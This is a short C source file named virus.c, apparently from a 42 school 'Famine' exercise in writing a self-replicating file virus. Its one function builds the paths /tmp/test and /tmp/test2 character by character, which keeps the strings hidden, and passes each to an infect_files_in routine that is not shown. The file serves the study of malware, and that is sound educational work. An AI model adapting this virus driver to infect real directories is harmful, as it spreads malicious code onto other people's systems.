/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   virus.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/07 06:36:21 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/12 18:01:52 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include "syscall.h"

#define ARRAY_SIZE(x) (sizeof(x) / sizeof(*x))

void	virus(uint64_t seed[2])
{
	const char *playgrounds[] =
	{
		(char[10]){'/','t','m','p','/','t','e','s','t','\0'},
		(char[11]){'/','t','m','p','/','t','e','s','t','2','\0'}
	};

	for (unsigned long i = 0; i < ARRAY_SIZE(playgrounds); i++)
	{
		infect_files_in(playgrounds[i], seed);
	}
}
